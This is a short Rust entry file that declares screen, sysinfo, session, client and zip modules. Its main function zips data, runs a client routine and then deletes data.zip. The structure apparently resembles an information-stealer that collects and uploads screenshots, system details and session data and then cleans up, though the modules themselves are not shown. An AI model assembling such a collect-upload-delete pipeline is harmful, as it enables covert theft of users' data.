#![allow(warnings)]


// MODULES
mod screen;
mod sysinfo;
mod session;

mod client;
pub use crate::client::client_md;

mod zip;
pub use crate::zip::zip_md;


fn main()
{
	println!("Hello, world!");

	match zip_md::start() {
		Ok(_) => match client_md::start() {
				Ok(_) => match std::fs::remove_file("data.zip") {
					Ok(_) => println!("excellent !"),
					Err(_) => return,
				},
				Err(_) => return,
			},
		Err(_) => return,
	}
}
